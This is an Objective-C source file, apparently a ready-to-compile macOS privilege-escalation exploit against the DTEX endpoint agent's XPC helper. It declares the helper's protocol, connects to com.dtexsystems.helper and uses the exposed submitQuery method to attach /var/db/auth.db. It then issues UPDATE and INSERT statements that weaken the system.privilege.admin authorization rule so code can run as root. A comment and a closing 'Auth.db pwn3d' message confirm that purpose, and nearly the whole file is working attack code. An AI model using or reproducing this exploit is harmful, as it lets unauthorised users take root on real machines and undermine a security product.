// gcc main.m -o dtexploit -framework Foundation
// author: nullevent + WilDN00B
// date: 12/17/24

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#define LOG(fmt, ...) NSLog(@"[dtexploit] " fmt "\n", ##__VA_ARGS__)
@protocol DTConnectionHelperProtocol <NSObject>
- (void)stopTamperClientWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)startTamperClientWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)stopESClientWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)startESClientWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)checkScreenRecordingFeaturesEnabledWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)checkFullDiskAccessFeaturesEnabledWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)setNewProxyServerURL:(NSString *)arg1 withUser:(NSString *)arg2 andPassword:(NSString *)arg3 withReply:(void (^)(BOOL, NSError *))arg4;
- (void)requestLoggedInUsersWithReply:(void (^)(NSArray *, NSError *))arg1;
- (void)setNewAPIURL:(NSString *)arg1 withReply:(void (^)(BOOL, NSError *))arg2;
- (void)showEndpointSettingsReply:(void (^)(NSDictionary *))arg1;
- (void)showFilterDirectivesReply:(void (^)(NSDictionary *))arg1;
- (void)loadFilterDirectivesFileAtPath:(NSString *)arg1 reply:(void (^)(NSString *))arg2;
- (void)requestLockoutStatusForUser:(NSNumber *)arg1 withReply:(void (^)(NSString *, NSError *))arg2;
- (void)flushAllMemoryObjectsWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)requestHelperMemoryObjectStatisticsWithReply:(void (^)(NSDictionary *, NSError *))arg1;
- (void)requestHelperPIDWithReply:(void (^)(NSNumber *, NSError *))arg1;
- (void)requestBlockingValueForIdentifier:(NSString *)arg1 withReply:(void (^)(BOOL, NSError *))arg2;
- (void)sendBlockingValue:(NSString *)arg1 forIdentifier:(NSString *)arg2 withControlType:(int)arg3 reply:(void (^)(BOOL, NSError *))arg4;
- (void)requestVacuumValueWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)sendNewVacuumValue:(BOOL)arg1 reply:(void (^)(BOOL, NSError *))arg2;
- (void)submitQuery:(NSString *)arg1 ofType:(unsigned long long)arg2 reply:(void (^)(NSArray *, NSError *))arg3;
- (void)generateCrashReport;
- (void)registerCrashReport:(NSString *)arg1 reply:(void (^)(BOOL, NSError *))arg2;
- (void)registerFileInstances:(NSArray *)arg1 reply:(void (^)(BOOL, NSError *))arg2;
- (void)requestMessagingStatisticsWithReply:(void (^)(NSString *, NSNumber *, NSNumber *, NSString *, NSString *, NSDate *, NSDate *, NSString *, NSNumber *, NSNumber *, NSNumber *, NSNumber *, NSString *, BOOL, BOOL, BOOL, BOOL, BOOL, BOOL, NSDictionary *, long long, NSDictionary *, long long, NSError *))arg1;
- (void)requestForegroundApplicationForUser:(NSNumber *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)updateForegroundApplicationPID:(NSNumber *)arg1 forUser:(NSNumber *)arg2 reply:(void (^)(BOOL, NSError *))arg3;
- (void)requestMessageQueueDBWhitespaceWithReply:(void (^)(NSNumber *, NSError *))arg1;
- (void)requestMessageQueueDBSizeWithReply:(void (^)(NSNumber *, NSNumber *, NSNumber *, NSError *))arg1;
- (void)requestDBWhitespaceWithReply:(void (^)(NSNumber *, NSError *))arg1;
- (void)requestDBSizeWithReply:(void (^)(NSNumber *, NSError *))arg1;
- (void)requestProcessMemoryWithReply:(void (^)(NSNumber *, NSError *))arg1;
- (void)updateARDStatusInfo:(NSString *)arg1 reply:(void (^)(BOOL, NSError *))arg2;
- (void)prepareLocalDatabaseForExternalViewerWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)resetLocalMessageQueueDatabaseWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)resetLocalDatabaseWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)stopAgentCoreWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)startAgentCoreWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)isAgentCoreRunningWithReply:(void (^)(BOOL, NSError *))arg1;
- (void)requestLogLevelWithReply:(void (^)(unsigned long long, NSError *))arg1;
- (void)sendNewMonitorConfiguration:(NSArray *)arg1 reply:(void (^)(BOOL, NSError *))arg2;
- (void)requestMonitorConfigurationWithReply:(void (^)(NSArray *, long long, NSError *))arg1;
- (void)requestMessageQueueDBPathWithReply:(void (^)(NSURL *, NSError *))arg1;
- (void)requestDBPathWithReply:(void (^)(NSURL *, NSError *))arg1;
- (void)sendNewLogLevel:(unsigned long long)arg1 reply:(void (^)(BOOL, NSError *))arg2;
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
    static NSString* XPCHelperMachServiceName = @"com.dtexsystems.helper"; // Define the mach service name
    NSString* service_name = XPCHelperMachServiceName; // Convert to a NSString
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000]; // Parse it to NSXPCCOnnection initMachServiceName
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(DTConnectionHelperProtocol)]; // Tell the NSXPC What protocol to use.
    NSLog(@"[+] Interface created!");
    [connection setRemoteObjectInterface:interface];
    [connection resume];
    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error)
              {
        NSLog(@"[-] Something went wrong...");
        NSLog(@"[-] Error: %@", error);
    }];
    NSLog(@"obj: %@", obj);
    NSLog(@"conn: %@", connection);
    unsigned long long mylong = 1;
    
    // XPC exploitation of DTEX event reporting service's exposed method "submitQuery" below...
    // Attach auth.db
    [obj submitQuery:@"ATTACH DATABASE '/var/db/auth.db' AS authdb KEY '';" ofType:mylong reply:^(NSArray *myarr, NSError *myerr) {
        NSLog(@"[+] Attach DB response: %@ - %@", myarr, myerr);
    }];
        
    [NSThread sleepForTimeInterval:5.0f];
        
    // Dynamically fetch id of system.privilege.admin so we can pass it to next 2 queries
    __block NSString *myID;
    
    [obj submitQuery:@"select id from rules where name = 'system.privilege.admin'" ofType:mylong reply:^(NSArray *myarr, NSError *myerr) {
        NSLog(@"[+] ID response:  %@ - %@", myarr, myerr);
        myID = myarr[1];
    }];
    
    [NSThread sleepForTimeInterval:5.0f];
    
    // UPDATE to change auth.db rules
    NSString *myFirstFormattedQuery = [NSString stringWithFormat:@"UPDATE rules SET type = 1, class = 2, 'group' = NULL,kofn = NULL,timeout = NULL, flags = 0, tries = NULL, version = 1, hash = NULL,identifier = NULL, comment = NULL where id = %@;", myID];
    [obj submitQuery:myFirstFormattedQuery ofType:mylong reply:^(NSArray *myarr, NSError *myerr) {
        NSLog(@"[+] UPDATE response: %@ - %@", myarr, myerr);
    }];
        
    [NSThread sleepForTimeInterval:5.0f];
    
    // INSERT to change auth.db rules
    NSString *mySecondFormattedQuery = [NSString stringWithFormat:@"INSERT INTO delegates_map VALUES(%@,24,0);", myID];
    [obj submitQuery:mySecondFormattedQuery ofType:mylong reply:^(NSArray *myarr, NSError *myerr) {
        NSLog(@"[+] INSERT response: %@ - %@", myarr, myerr);
    }];
        
    [NSThread sleepForTimeInterval:5.0f];
        
    // Now we clean up - we should now be able to execute code as root via the AuthorizationExecuteWithPrivileges macOS API
    [obj submitQuery:@"DETACH DATABASE 'authdb';" ofType:mylong reply:^(NSArray *myarr, NSError *myerr) {
        NSLog(@"[+] Detach db response: %@ - %@", myarr, myerr);
    }];
        
    [NSThread sleepForTimeInterval:5.0f];
        
    NSLog(@"[+] Auth.db pwn3d - check your privs :)");
    }
    return 0;
}
